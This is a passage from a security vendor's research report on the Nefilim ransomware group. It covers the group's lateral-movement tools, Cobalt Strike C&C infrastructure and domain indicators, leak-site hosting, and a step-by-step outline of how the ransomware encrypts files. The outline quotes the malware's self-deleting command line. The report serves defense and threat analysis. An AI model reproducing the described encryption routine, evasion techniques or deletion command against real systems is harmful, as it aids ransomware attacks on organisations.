C:\\Users\\[redacted]\\Downloads\\1.log HS_MIMIKATZLOG.SM\n\n08/03/2020 21:46 C:\\Users\\[redacted]\\Downloads\\1.log HS_MIMIKATZLOG.SM\n\nTable 2. The tools an attacker dropped in our investigation \n\nNote: Host information have been redacted\n\nIn a few cases, we have also observed the use of a tool called AdFind that searches the Active Directory \n\nfor setup attributes48 that can include computers and users who are part of the Active Directory domain. \n\nWhile system administrators can use this tool, other similar tools are considered suspicious. One of which \n\n\n\n21 | Modern Ransomware’s Double Extortion Tactics and How to Protect Enterprises Against Them\n\nis BloodHound, an Active Directory visualization tool that can help identify different attack paths and \n\nunderstand the properties of the Active Directory.49\n\nWhile Cobalt Strike uses multiple beacons to communicate to and from the command-and-control (C&C) \n\nservers, we have seen Nefilim actors using DNS, HTTP, or HTTPS protocols. Attackers typically deploy \n\nCobalt Strike in strategic places on the network, such as important systems to which the attacker knows \n\nthey will need extended access. Most often, these are servers and not workstations. Attackers can also \n\navoid detection by using DNS beacons, which provide an inconspicuous — albeit slower — transmission \n\nof files and other items for exfiltration.50 Because of this, we have also seen in many cases the use \n\nof MegaSync, a cloud-based synchronization application of the infamous MEGA cloud storage service, \n\nto exfiltrate data.51 In some cases, attackers have used HTTP or HTTPS beacons as opposed to DNS \n\nbeacons, which allows for faster data exfiltration. This is possibly why we might not always see both DNS \n\nexfiltration and MegaSync in the case of Nefilim. \n\nTable 3 lists the tools that we have observed being used in lateral movement and privilege escalation. \n\nHowever, it should be noted that ransomware actors are not limited to these tools. Attackers use tools \n\nbased on the environment being compromised and what tools they think they can run without getting \n\ncaught. \n\nMITRE ATT&CK TTPs\n\nTactic Technique Observable\n\nLateral movement\n\nT1550: Use alternate authentication \nmaterial\n\nAttackers can use Mimikatz to dump hashes, \ntickets, or plain text passwords.\n\nT1570: Lateral tool transfer Attackers can deploy tools within systems to \naid in lateral movement.

The tools used in lateral movement and privilege escalation\n\n\n\n22 | Modern Ransomware’s Double Extortion Tactics and How to Protect Enterprises Against Them\n\nRecommended Defenses: Preventing Ransomware Attacks by \n\nBlocking Lateral Movement and Privilege Escalation\n\nDefending systems against the lateral movement and privilege escalation phase of a modern ransomware \n\nattack can be difficult. This is because attackers are more likely to abuse legitimate tools that administrators \n\nregularly utilize. In this attack phase, ransomware actors have already gotten inside the network and \n\nare starting to look for other hosts to compromise. And though it is possible for the time between the \n\ninitial breach and the lateral movement phase to be lengthy, once the lateral movement phase starts, \n\nmost actors tend to work more quickly knowing that their risk of discovery increases. During this stage, \n\nattackers will prioritize moving between hosts. Modern ransomware actors operating the same business \n\nmodel favored by the Nefilim group will start exfiltrating data. \n\nNetwork Segmentation and Micro-Segmentation to Inhibit Lateral Movement \nand Support Security Monitoring\n\nAttackers looking to extort victims through data theft and destruction with ransomware must first move \n\naround the network to discover sensitive data. Making lateral movement more difficult for an attacker \n\nslows them down and increases the chances that they will be discovered through effective security \n\nmonitoring.\n\nFLAT NETWORK\n\nSecurity perimeter\n\nAttacker breaches\nthe firewall \n\nAttacker moves laterally and\nescalates privileges to access\n\ncritical information\n\nDAAS DAAS DAAS DAAS\n\n1\n\n2\n\nAttacker exfiltrates\ncritical information\n\n3\n\nAttacker launches\nransomware payload\n\n4\n\nSEGMENTED NETWORK\n\nSecurity perimeter\n\nAttacker breaches\nthe firewall \n\nAttacker is not able to move\nlaterally and escalate privileges\ndue to network segmentation\n\nDAAS DAAS DAAS DAAS\n\n1\n\n2\nProtected\nsubnet\n\nProtected\nsubnet\n\nFigure 9.

A diagram showcasing the differences between network segmentation and micro-segmentation\n\nOrganizations can benefit from segmenting office and server networks to effectively limit an attacker’s \n\nscope of compromise. This can be done by micro-segmenting information systems, using properly \n\ndefended management networks to protect underlying administrative interfaces on network infrastructure, \n\nand employing virtualization and cloud infrastructures. \n\nIntrusion Detection Systems\n\nIntrusion detection systems (IDS) can help detect malicious activities and aid security operations in \n\ntracking anomalous events after attackers have gained initial access to a system. IDS sensors can detect \n\nattackers leveraging compromised users, unknown malware, exploits, or covert C&C channels at the \n\nnetwork, cloud, and endpoint, and server layers.\n\nMulti-Factor Authentication \n\nEmploying multi-factor authentication (MFA) is a good way to limit the reuse of comprised credentials that \n\nmay have already been stolen or collected by attackers from data breaches.52 Attackers who have access \n\nto accounts that are being used in multiple machines and are running without MFA will be able to log in, \n\nexecute commands, and pivot to more machines. This allows attackers to more easily perform lateral \n\nmovement inside the network. It should be noted that security best practices must be followed when \n\nusing local authentication methods, such avoiding the use of the same password on multiple machines \n\nand limiting the use of any administrative accounts if the built-in administrator must be enabled. \n\nCalling Home and Exfiltration\nAs discussed in the previous section, Nefilim-associated actors frequently use the commercially available \n\nsoftware Cobalt Strike after they have successfully compromised an organization’s network. Cobalt \n\nStrike is a versatile post-exploitation penetration tool that allows penetration testers, red teams, and \n\nunfortunately, attackers, to further attack the network, control the compromised system, and exfiltrate \n\ninteresting data. For this to work, Cobalt Strike beacon is run on or injected into the compromised system. \n\n Internet Next-generation\nfirewall (NGFW)\n\nVM\n\nVM\n\nVM\n\nVM\n\nVM\n\nVM\n\nNetwork segmentation\n\n Internet Next-generation\nfirewall (NGFW)\n\nVM\n\nVM\n\nVM\n\nVM\n\nVM\n\nVM\n\nMicrosegmentation\n\n\n\n24 | Modern Ransomware’s Double Extortion Tactics and How to Protect Enterprises Against Them\n\nWhen the software is abused for nefarious purposes, the beacon will connect back to the Cobalt Strike \n\nC&C server that an attacker controls.  The callback can be achieved using several protocols, including \n\nHTTP, HTTPS, and DNS, as we have observed in the Nefilim attacks that we have analyzed. The attacker \n\ncan connect to the team server component of the Cobalt Strike server, by default on port 50050/TCP. \n\nWhen this happens, the attacker can have a convenient overview of all compromised systems and the \n\ncapability to remotely execute attacks. Our analysis of Nefilim attacks points to evidence showing that \n\nthe attackers are connecting to different Cobalt Strike C&C servers through residential IP addresses, \n\nindicating that those have been compromised as well.\n\nFigure 11. A screenshot of the Cobalt Strike management interface. \n\nImage source: www.cobaltstrike.com \n\nWe have also seen different clusters on the internet hosting Nefilim-related Cobalt Strike C&C servers. \n\nThe actors have a preference for hosting companies in various countries including Bulgaria, the UK, the \n\nUS, and the Netherlands. Other Nefilim-related Cobalt Strike C&C servers are hosted through small \n\nbulletproof web hosting services created by various shell companies. These might belong to one bigger \n\nbulletproof hosting company. As far as we can tell, there are dozens of these shell companies, with their \n\nassigned IP ranges mostly being used for nefarious purposes. Most of these shell companies have been \n\nin business for several years and thus can provide stable bulletproof hosting for bad actors. Some of the \n\nshell companies seem to be set up almost exclusively for hosting Cobalt Strike beacon C&Cs, large scale \n\ninternet scanning (including the scanning of Citrix servers), and in one case, the clear-web back end for a \n\nTor-hidden website in which Nefilim actors post data stolen from their victims.\n\n\n\n25 | Modern Ransomware’s Double Extortion Tactics and How to Protect Enterprises Against Them\n\nBased on our observation, Nefilim actors make use of at least three different kinds of bulletproof hosting \n\nservices. Apart from a Tor-hidden server that is used to leak stolen information from victims and the small \n\nIP ranges belonging to small shell companies, Nefilim also makes use of the so-called fast flux hosting. \n\nThe front end of the clear-web website corpleaks[.]net, where attackers upload information stolen from \n\nvictims, is hosted on a fast flux network. This means that the front end regularly changes its IP address. \n\nThe same was true for the affiliate website of Nemty operators. The RaaS back end of Nefilim, which hosts \n\nthe real content, is hosted through a fast flux network to keep it from being taken down for an extended \n\nperiod of time. We are confident that we have identified the back-end server of corpleaks[.]net, however, \n\nit is hosted by one of the small shell companies that offers bulletproof hosting. \n\nOne remarkable thing that we have discovered is that Nemty’s websites, which were hosted on fast flux \n\nnetworks, consistently shared front-end IP addresses with websites of the infamous slilpp[.]io actors \n\nfor more than one year. The slilpp[.]io actors specialize in the large-scale stealing and selling of financial \n\nassets. Whether sharing the same kind of fast flux front-end servers is merely coincidental or otherwise \n\nis part of our ongoing research.\n\nFigure 12. The passive DNS data of slilpp[.]io and Nemty \n\nCobalt Strike beacon callbacks may be used by Nefilim actors to exfiltrate sensitive data in chunks \n\nof a fixed size. When the Cobalt Strike beacon malware makes use of DNS as a C&C protocol, victim \n\nmachines will not directly communicate with the C&C servers, but via a configured recursive DNS server. \n\nFor the exfiltration of large files, malicious actors have also been observed using external data sharing \n\nplatforms like MEGA to exfiltrate data. Beginning Spring 2020, we have logged exfiltration data from an \n\nFTP server that was likely set up specifically for such a task.\n\n\n\n26 | Modern Ransomware’s Double Extortion Tactics and How to Protect Enterprises Against Them\n\nC&C Date Created IP Address Country Protocol\nConfidence \n\nLevel\n\n89.105.195.203 ~2020-01-13 89.105.195.203 Netherlands HTTPS High\n\n179.60.146.11 ~ 2020-02-02 179.60.146.11 Sweden HTTPS High\n\n185.147.15.14 ~ 2020-02-02 185.147.15.14 Netherlands HTTPS High\n\nlocalskype.com 2020-03-06T20:27:25.00Z 88.214.26.57 Bulgaria DNS High\n\nnsskype.com 2020-03-06T20:27:25.00Z 88.214.26.57 Bulgaria DNS High\n\nns1.dnsskype.com 2020-03-06T20:27:25.00Z 88.214.26.57 Bulgaria DNS High\n\nns1.dnsskype.com 2020-03-06T20:27:25.00Z 5.188.206.219 Bulgaria DNS High\n\nns1.safeinet.dev 2020-06-01T12:40:16Z 109.234.36.148 Netherlands DNS High\n\nsecurityupdatewin32.\norg\n\n2020-07-01T11:52:53Z 209.250.247.32 Netherlands HTTPS Low\n\nns1.fairyschool.art 2020-07-01T19:55:54.0Z 88.214.26.29 Bulgaria DNS Low\n\nwin7securityupdate.net 2020-07-16T14:46:59Z 209.250.243.71 Netherlands HTTP Low\n\nadobeupdate7x32.org 2020-08-26T11:51:19Z 78.141.211.59 Netherlands HTTPS Low\n\nns1.msdn7x32.net 2020-08-28T13:07:24Z 89.44.9.221 France DNS High\n\nmsdn64x7.net 2020-08-31T11:08:41Z 95.179.155.43 Netherlands HTTPS High\n\n193.239.84.186 ~ 2020-08-31 193.239.84.186\nUnited \nKingdom\n\nHTTPS High\n\nns1.vaultsecure.net 2020-09-02T10:13:36.00Z 5.188.206.221 Bulgaria DNS High\n\niqio.net 2020-09-17T12:07:02.00Z 185.153.198.134 Romania HTTP High\n\nns1.iioq.me 2020-09-17T12:07:05Z 185.153.198.7 Romania DNS High\n\nns1.iioq.io 2020-09-17T12:07:11Z 185.153.198.33 Romania DNS High\n\nns1.emailsafety.net 2020-09-29T21:07:29.00Z 88.214.26.33 Bulgaria DNS High\n\nwinupdate10pack2048.\nnet\n\n2020-10-15T09:36:01Z 95.179.138.46 Netherlands HTTP High\n\nns1.owadns.com 2020-10-19T11:37:10.00Z 45.227.252.161 Netherlands DNS Low\n\nns1.owadns.net 2020-10-19T11:37:20.00Z 45.227.252.59 Netherlands DNS Low\n\nwebintercom76delivery.\nnet\n\n2020-11-02T09:38:06Z 185.141.24.71 Netherlands HTTP Low\n\nns1.cafesunshine.me 2020-11-09T12:25:23Z 46.161.27.212 Netherlands DNS High\n\nns1.siteswhoisit.com 2020-12-30T12:06:12.00Z 41.216.186.237 Netherlands DNS Low\n\ndns12.org 2021-01-11T15:02:48Z 144.202.108.45 United States HTTP Medium\n\ndns20.net 2021-01-11T15:56:57.00Z 95.179.152.5 Netherlands HTTP Medium\n\ndns25.net 2021-01-11T16:41:25.00Z 185.244.150.147 Netherlands HTTP Medium\n\nns1.dns30.net 2021-01-11T17:23:20.00Z 194.36.191.31 Netherlands DNS Medium\n\ndns35.net 2021-01-11T18:08:12.00Z 194.36.191.25 Netherlands HTTPS Medium\n\nTable 4. Cobalt Strike domains used by Nefilim\n\n\n\n27 | Modern Ransomware’s Double Extortion Tactics and How to Protect Enterprises Against Them\n\nTactic Technique Observable\n\nAutomated exfiltration T1020 Adversaries may exfiltrate data, such as sensitive documents, \nthrough the use of automated processing after being gathered during \ncollection.\n\nExfiltration over C2 \nchannel\n\nT1041 Adversaries may steal data by exfiltrating it over an existing command \nand control channel. Stolen data is encoded into the normal \ncommunications channel using the same protocol as command and \ncontrol communications.\n\nData transfer size \nlimits\n\nT1030 Adversaries may exfiltrate data in fixed-size chunks instead of whole \nfiles or limit packet sizes below certain thresholds. This approach may \nbe used to avoid triggering network data transfer threshold alerts.\n\nExfiltration over \nalternative protocol\n\nT1048 Adversaries may steal data by exfiltrating it over a different protocol \nthan that of the existing command and control channel. The data may \nalso be sent to an alternate network location from the main command \nand control server.\n\nExfiltration over web \nservice\n\nT1567 Adversaries may use an existing, legitimate external web service to \nexfiltrate data rather than their primary command and control channel. \nPopular web services acting as an exfiltration mechanism may give \na significant amount of cover due to the likelihood that hosts within a \nnetwork are already communicating with them prior to compromise. \nFirewall rules may also already exist to permit traffic to these services.\n\nTable 5. The TTPs used in Cobalt Strike\n\nRecommended Defenses: Halting Ransomware Attacks by Preventing Cobalt \nStrike C&C Server Misuse \n\nTo protect systems from Nefilim’s calling back to Cobalt Strike C&C servers, we recommend keeping \n\nantivirus (AV) solutions up-to-date and implementing machine learning plugins of AV software. Defenders \n\nmust also monitor — and if applicable, block — suspicious DNS, HTTP, and HTTPS connections. A policy \n\ncan be created to block the uploading of files to file-sharing platforms, however it should be noted that \n\nthis could hinder legitimate day-to-day operations. It is important to take measures to detect and block \n\ntraffic to Cobalt Strike C&C servers in general. Since Cobalt Strike is designed to evade detection by \n\nsecurity software, a multilayered approach is imperative in thwarting this type of threat. In some cases, \n\nit is possible to detect Cobalt Strike beaconing by looking at suspicious internet traffic patterns. For \n\nexample, when an attacker uses DNS as the communication protocol for his Cobalt Strike malware, \n\nregular DNS requests to relatively young domains in the log files of the corporate recursive DNS server \n\ncan be viewed as possible C&C traffic. It is critical to block Cobalt Strike C&C traffic that makes use of \n\ndefault Cobalt Strike settings and known JARM53 fingerprints to either generate block lists or use third-\n\nparty block lists of known Cobalt Strike C&C servers.\n\n\n\n28 | Modern Ransomware’s Double Extortion Tactics and How to Protect Enterprises Against Them\n\nMalware Payload\nThe first Nefilim ransomware sample we detected (SHA-256: 08c7dfde13ade4b13350ae290616d7c2f4a87c \n\nbeac9a3886e90a175ee40fb641) has a compilation date of March 10, 2020, at 01:40 (UTC). At the time, \n\nthe file was signed with a valid certificate issued by Sectigo, a cybersecurity provider of digital identity \n\nsolutions. The sample was written in pure C/C++ using the Windows API and compiled for a 32-bit \n\narchitecture. No packers or cryptors were used in the sample. We have reached out to Sectigo, who \n\nhas promptly revoked all of the certificates used in this campaign, therefore making the execution of the \n\nmalware substantially more difficult. It should be noted that Sectigo already revoked almost half of the \n\ncertificates included in our report before we contacted them.\n\nThe malware decrypts a ransom note using a fixed RC4 key. It features three email addresses that victims \n\ncan use to contact the Nefilim actors about the ransom payment.\n\nFigure 13. The Nefilim ransom note \n\nIt then generates a random AES key for each file that it queues for encryption.\n\nTo enable file decryption in case the victim pays the ransom amount, the malware encrypts the generated \n\nAES key with a fixed RSA public key and appends it to the encrypted file. To date, only the attackers can \n\ndecrypt this scheme as they alone own the paired private RSA key. \n\nDetailed Execution Flow\n\nAs stated in previous sections, Nefilim is a post-compromise ransomware. Therefore, it is launched \n\nmanually by actors or affiliates only after they determine that they have adequate control over the victim’s \n\ninfrastructure. Once it is running, the execution flow is very straightforward. First, Nefilim creates a mutual \n\nexclusion (mutex) object to prevent more than one thread of the same process.\n\n\n\n29 | Modern Ransomware’s Double Extortion Tactics and How to Protect Enterprises Against Them\n\nFigure 14. Creation of a mutex\n\nThe next step involves decrypting the ransom note. This is done by calculating the SHA-1 digest from a \n\nhard-coded string to further derive it to an RC4 key. This is carried out using the following functions from \n\nthe Microsoft CryptoAPI platform, which Microsoft has marked as deprecated a few years ago:\n\n•\t CryptAcquireContextA\n\n•\t CryptCreateHash\n\n•\t CryptHashData\n\n•\t CryptDeriveKey\n\nIf any of these functions fail, the ransomware exits without encrypting anything. It should be noted \n\nthat though Microsoft CryptoAPI is deprecated, they still work on recent versions of Windows, such as \n\nWindows 10.\n\nNefilim has the ransom note hard-coded, encrypted with this RC4 key, and further encoded with base64.\n\n\n\n30 | Modern Ransomware’s Double Extortion Tactics and How to Protect Enterprises Against Them\n\nFigure 15. Decryption of the ransomware note\n\nWhen the abovementioned function is called, the ransom note is kept in memory. It will be written to disk \n\nin a succeeding step.\n\nRSA Key Import\n\nAfter decrypting the ransom note, Nefilim imports an RSA-2048 public key and leaves it ready to use for \n\nencryption.\n\nFigure 16. Importing the RSA-2048 public key for encryption\n\nThe key used by the function above is stored in the .rdata section of the executable, as shown in Figure 17.\n\n\n\n31 | Modern Ransomware’s Double Extortion Tactics and How to Protect Enterprises Against Them\n\nFigure 17. The Base64-encoded RSA public key used to decrypt the ransom note\n\nImpact Modes\n\nSingle Directory\n\nThe Nefilim payload supports a command-line argument that contains the full directory path. This contains \n\nthe files the attacker wants to encrypt. In this mode, it does not create a ransom note. We believe that \n\ncriminals use this for testing purposes and/or manual encryption of specified directories for performance \n\nreasons.\n\nNormal Operation and File Encryption\n\nIf launched without any arguments, the Nefilim executable prepares to encrypt all logical drives with \n\nwriting permissions, including A:, B:, C:, and D:, in an affected Windows machine. Removable drives and \n\nnetwork shares are also targeted but the latter must be mapped to a drive letter for Nefilim to see it.\n\nFigure 18. The malware iterates through drives to encrypt\n\nFor each suitable logical drive found, Nefilim decrypts and writes a ransom note file named “NEFILIM-\n\nDECRYPT.txt” (or “<VARIANT_NAME>-DECRYPT.txt”) in the drive root and creates a thread to encrypt all \n\ncontent in the drive.\n\n\n\n32 | Modern Ransomware’s Double Extortion Tactics and How to Protect Enterprises Against Them\n\nFigure 19. Function for creating the ransom note\n\nExclusions\n\nBefore Nefilim starts to encrypt files, it checks if they match its exclusion list of files and directory names, \n\nas seen in Figure 20.\n\nFigure 20. Files excluded from Nefilim encryption\n\nThis prevents Nefilim from encrypting essential files to allow the operating system and common applications \n\nsuch as browsers and e-mail clients to continue working properly. Some folders directly related to common \n\nsecurity products are also excluded, probably to avoid being detected by such products.\n\n\n\n33 | Modern Ransomware’s Double Extortion Tactics and How to Protect Enterprises Against Them\n\nIt also skips files with the following extensions:\n\n•\t .cab\n\n•\t .cmd\n\n•\t .com\n\n•\t .cpl\n\n•\t .dll\n\n•\t .exe\n\n•\t .ini\n\n•\t .lnk\n\n•\t .log\n\n•\t .mp3\n\n•\t .mp4\n\n•\t .msi\n\n•\t .pif\n\n•\t .ttf\n\n•\t .url\n\nAdditionally, it also skips encrypting files that have previously been encrypted by checking the extension \n\nof the variant name, such as .NEFILIM and .MERIN. The exclusion list has changed for later versions of \n\nNefilim variants, but it is still hard-coded.\n\nFile Encryption\n\nThe largest function in the Nefilim code is the encryption function. It uses different code techniques to \n\nattempt to bypass security products.\n\nThe overall algorithm:\n\n1.\t Generate two 128-bit random numbers using the RtIGetRandom/SystemFunction036 function \n\nfrom ADVAPI32.DLL. As this function is not exported, Nefilim actors load it using LoadLibrary and \n\nGetProcAddress. The second generated number will be used as an AES-128 key in the future.\n\n\n\n34 | Modern Ransomware’s Double Extortion Tactics and How to Protect Enterprises Against Them\n\nFigure 21. RtlGetRandom function dynamic resolution\n\n2.\t Encrypt both numbers with the RSA public key and write the result to the end of the target file\n\n3.\t Write an ASCII string containing the variant name to the end of the target file\n\n4.\t Read the file content to a buffer\n\n5.\t Encrypt the file content with AES-128 using the second random number as the key\n\n6.\t Write the encrypted content back to the file, replacing the original content\n\n7.\t Free both generated random numbers and the encrypted keys from memory\n\n8.\t Add the variant name as an extension to the encrypted file\n\n9.\t Remove itself three seconds after completing encryption by executing the following commands: cmd.\n\nexe /c timeout /t 3 /nobreak && del <path> /s /f /q\n\nVariants and Evolution\n\nAfter its first version was spotted in the wild, we have continued to monitor Nefilim’s activities and its \n\nevolution. To date, we have observed 18 different variants among an estimated 75 different samples, \n\nusing a total of 22 valid certificates. We also noticed that the Nefilim actors tried to switch from Microsoft \n\nCryptoAPI to a newer replacement called Cryptography API: Next Generation (CNG).54 We captured a \n\nunique sample that uses functions from the bcrypt.h header, which is a part of CNG API:\n\nFigure 22. CNG (bcrypt.dll) functions seen in the Merin variant\n\nThe file analyzed in Figure 22 has a compilation date of October 4, 2020. It loads both crypt32dll and \n\nbcrypt.dll dynamically, using LoadLibraryA and LoadLibraryW, respectively. This completely replaces \n\nCryptoAPI and the need for ADVAPI32.dll as seen in previous samples written in C++. Interestingly, we \n\n\n\n35 | Modern Ransomware’s Double Extortion Tactics and How to Protect Enterprises Against Them\n\nobserved a major evolution on July 9, 2020, when the first variant of Nefilim written in the Go language \n\nappeared.\n\nThroughout the different variants, the most significant change started with samples that encrypted files \n\nusing the .MILIHPEN file extension. This variant completed the migration from CryptoAPI to CNG and \n\nuses an embedded JavaScript Object Notation (JSON)-based configuration. This suggests that a Nefilim \n\nransomware builder exists. The JSON has configuration fields for mutex name, ransom note content, \n\nransom note filename, RSA public key, directory names, file extensions to skip, and Windows API function \n\nnames to resolve dynamically.\n\nFigure 23. An example of a JSON-based configuration for the .MILIHPEN variant\n\nThis variant also has some debugging function calls that tell whoever runs the payload at which stage the \n\nransomware resides. This was not surprising given the fact that Nefilim has been used as post-intrusion \n\nransomware that is manually operated by its attackers.\n\nFigure 24. Debug messages from .MILIHPEN variant\n\n\n\n36 | Modern Ransomware’s Double Extortion Tactics and How to Protect Enterprises Against Them\n\nFigure 25. Success message when encryption is finished\n\nOther variants include small tweaks to the code. For example, the GANGBANG variant added a custom \n\nencryption to hide its JSON-based configuration. It first decodes it using base64 and then decrypts it with \n\na custom algorithm as shown in Figure 26.\n\nFigure 26. Base64 decoding of the JSON-based configuration\n\nFigure 27. Custom JSON-based configuration decryption algorithm with a fixed key\n\n\n\n37 | Modern Ransomware’s Double Extortion Tactics and How to Protect Enterprises Against Them\n\nWe have summarized the evolution of the Nefilim ransomware and took note of its variants in our Appendix. \n\nBased on the information we have gathered, Nefilim samples follow a consistent pattern. This suggests \n\nthat:\n\n•\t Each victim gets a unique sample including the contact information of the ransomware actors in the \n\nform of three e-mail addresses in the ransom note.\n\n•\t When Nefilim authors change the certificate they use to sign the binaries, they also change the \n\nextension added to encrypted files.\n\nThere are quite a few interesting PDB strings and mutexes in the Nefilim samples we have found. Our \n\ninvestigation shows that most of the mutexes are connected to specific Russian rap songs. We will \n\nexplore this angle further in the Attribution section.\n\nMITRE ATT&CK TTPs\n\nTactic Technique Observable\n\nInitial access T1078 – Valid accounts Adversaries may obtain and abuse \ncredentials of existing accounts as \na means of gaining initial access, \npersistence, privilege escalation, or \ndefense evasion.\n\nExecution T1106 – Native API* Adversaries may directly interact \nwith the native OS application \nprogramming interface (API) to \nexecute behaviors.\n\nT1059 - Command and scripting \ninterpreter\n\nAdversaries may abuse command \nand script interpreters to execute \ncommands, scripts, or binaries.\n\nPrivilege escalation T1055 - Process injection Adversaries may inject code \ninto processes in order to evade \nprocess-based defenses as well as \npossibly elevate privileges.\n\nDefense evasion T1140 – Deobfuscate/Decode files \nor information\n\nAdversaries may use obfuscated \nfiles or information55 to hide \nartifacts of an intrusion from \nanalysis.\n\nT1070 – Indicator removal on host* Adversaries may delete or alter \ngenerated artifacts on a host \nsystem, including logs or captured \nfiles such as quarantined malware.\n\nT1070.004 - File deletion* Adversaries may delete files left \nbehind by the actions of their \nintrusion activity.\n\n\n\n38 | Modern Ransomware’s Double Extortion Tactics and How to Protect Enterprises Against Them\n\nTactic Technique Observable\n\nDiscovery T1083 - File and directory \ndiscovery*\n\nAdversaries may enumerate files \nand directories or may search \nin specific locations of a host \nor network share for certain \ninformation within a file system.\n\nT1120 - Peripheral device \ndiscovery*\n\nAdversaries may attempt \nto gather information about \nattached peripheral devices and \ncomponents connected to a \ncomputer system.\n\nT1135 - Network share discovery* Adversaries may look for folders \nand drives shared on remote \nsystems as a means way to \nidentify of identifying sources \nof information to gather as a \nprecursor for collection and to \nidentify potential systems of \ninterest for lateral movement.\n\nLateral movement T1570 - Lateral tool transfer Adversaries may transfer tools or \nother files between systems in a \ncompromised environment.\n\nImpact T1486 - Data encrypted for impact* Adversaries may encrypt data \non target systems or on large \nnumbers of systems in a network \nto interrupt availability to system \nand network resources.\n\nT1489 - Service stop Adversaries may stop or disable \nservices on a system to render \nthose services unavailable to \nlegitimate users.\n\nTable 6.

The following ransomware mitigation techniques can work \n\nto protect users from this ransomware family: \n\n•\t Back up important files using the 3-2-1 rule: Have at least three copies, in two different formats, with \n\none of those copies off-site.56 The cloud is a good offsite backup, which provides additional security \n\nfeatures such as data encryption and server virtualization.57\n\n•\t Limit access to shared or network drives and turn off file sharing to minimize the risk of ransomware \n\nspreading throughout the network.\n\n\n\n39 | Modern Ransomware’s Double Extortion Tactics and How to Protect Enterprises Against Them\n\n•\t Employ canary file-based monitoring and process killing. Organizations can make use of canary files, \n\nwhich are essentially files that ransomware actors are more likely to infect but are not valuable to the \n\ncompany. When ransomware actors infect canary files, it will trigger an alert for security teams.58\n\n•\t Monitor encrypted network traffic via Next-Generation Intrusion Prevention System (NGIPS). This \n\nsecurity tool allows SOC teams to inspect network traffic metadata to see where encryption and \n\ndecryption are done.\n\nVictimology \nThe profile of a Nefilim victim is relatively broad in terms of location and industry. Nefilim has been \n\nobserved to target multi-billion companies more than other ransomware groups. Nefilim has also been \n\nable to keep its website up and running for more than a year. At times, the Nefilim ransomware group \n\nposts the sensitive data of their victims over several weeks and even months to scare future victims into \n\npaying ransom.  \n\nThe majority of Nefilim victims are located in North and South America, but victims are dotted throughout \n\nEurope, Asia, and Oceania.\n\nBased on our observation, the US has been consistently targeted from Q3 2020 to Q1 2021.\n\nAustralia Brazil Canada France Germany India Italy Jamaica\n\nMexico New Zealand Sri Lanka Sweden Switzerland United Kingdom USA\n\nMar\n2020\n\nApr\n2020\n\nMay\n2020\n\nJun\n2020\n\nJul\n2020\n\nAug\n2020\n\nSep\n2020\n\nOct\n2020\n\nNov\n2020\n\nDec\n2020\n\nJan\n2021\n\nMar\n2021\n\nFeb\n2021\n\nFigure 28.

Nefilim victims by industry and location\n\nThe next section compares Nefilim with 16 other RaaS actors. Nefilim distinguishes itself from most other \n\nransomware families by targeting high-profile companies with revenues often reaching billions of dollars \n\nper year. Nefilim also shows better control over its website compared to other ransomware families and is \n\nparticularly vicious when it comes to leaking victims’ sensitive data over extended periods of time. \n\nBased on our data, there has been a steady and substantial growth in the amount of sensitive data that \n\nNefilim actors leaked.\n\n\n\n41 | Modern Ransomware’s Double Extortion Tactics and How to Protect Enterprises Against Them\n\n0\n\n2K\n\nJan\n2021\n\nDec\n2020\n\nNov\n2020\n\nOct\n2020\n\nSep\n2020\n\nAug\n2020\n\nJul\n2020\n\nJun\n2020\n\nMay\n2020\n\nApr\n2020\n\nMar\n2020\n\n4\n51\n\n131\n187\n\n321 333\n\n647\n746\n\n1,040\n\n1,196\n\n1,752\n\nFigure 30. The cumulative data (in gigabytes) leaked by Nefilim actors from March 2020 to January 2021\n\nLeaking of Stolen Data: Nefilim Actors vs. Different RaaS \n\nActors \n\nTo put further pressure on their victims, ransomware actors often threaten to leak sensitive data that have \n\nbeen stolen before deploying ransomware in their compromised networks. We found at least 16 other \n\nransomware actors who maintain websites wherein they publish their victims’ stolen data. Some of these \n\nwebsites are on Tor-hidden servers while others are hosted using bulletproof hosting. Some RaaS actors \n\nupload stolen files on commercially available and free file-sharing platforms. The effect of these sensitive \n\ndata leaks on victims is not immediately clear. It is unlikely for a victim to eventually pay a ransom to a \n\nmalicious actor to get sensitive data removed from a website, or to prevent even more stolen data from \n\nbeing leaked. Once sensitive data is stolen, a victim cannot do much else: sensitive data is already in the \n\nhands of malicious actors who can wreak havoc and monetize that data in different ways.\n\nWe think that the primary reason ransomware actors leak sensitive data is to issue a clear warning to \n\nfuture victims: ransomware actors will try to cause further harm when the ransom amount is not paid. \n\nSome attackers seem to act in opportunistic ways and try to explore new ways of illicitly earning money. \n\nFor example, the infamous REvil actors boldly started an “auction” option on their website on the dark \n\nweb.59 The stolen data of a victim organization that refused to pay the ransom is put on sale on their \n\nwebsite to be sold to the winning auction bidder. To date, no one has participated in the REvil auction; \n\nall auction deadlines for stolen data have already passed without any public bids. But though this tactic \n\nseemed to have failed thus far, if and when malicious actors start to successfully auction off stolen data, \n\nit would prove to have a chilling effect on ransomware victims.\n\n\n\n42 | Modern Ransomware’s Double Extortion Tactics and How to Protect Enterprises Against Them\n\nSome ransomware actors, including Cl0p, have also threatened to release the sensitive data of an \n\norganization that they have breached unless a ransom is paid. \n\nWe researched the leaked sites of 16 ransomware actors and found significant differences in the way these \n\nactors implemented their successful extortion tactics. Most actors claim that they will keep stolen data \n\npublicly available for several months. Some actors such as Nefilim and Cl0p manage to keep terabytes of \n\nstolen data online for over a year and claim to regularly leak an increasing amount of data from the same \n\nvictim. Other actors, such as LockBit and REvil, host their stolen data mostly on free and premium file-\n\nsharing platforms. These file-sharing platforms are usually quick to take down content that goes against \n\ntheir terms and conditions. This means that only a limited amount of the stolen data by REvil and LockBit \n\ncan actually be downloaded. We have also observed that the REvil RaaS website has many dead links to \n\nURLs that previously hosted their stolen data, which gives off an impression of disorganization. Several \n\nactors make stolen data available via Tor-hidden websites. However, storing hundreds of gigabytes of \n\nstolen data on a Tor-hidden server is of limited use: downloading large archive files over Tor takes time — \n\nin some cases up to several days — because of its low throughput. A determined person will eventually \n\nsucceed in downloading data over Tor, but for extortion purposes, this kind of hosting on the dark web \n\ndoes not make much sense. \n\nSome actors also host files on their own websites on the clear web. For instance, Nefilim actors have both \n\nclear web and Tor-hidden websites on which they publish stolen data. We detailed how Nefilim’s website \n\nuses fast flux bulletproof hosting in the “Calling Home and Exfiltration” section. This is mainly because \n\nNefilim’s clear web website is hosted by fast flux bulletproof hosting.\n\n250\n0 250\n\nRanzy\n\nBabuk\n\nCuba\n\nLockBit\n\nMount 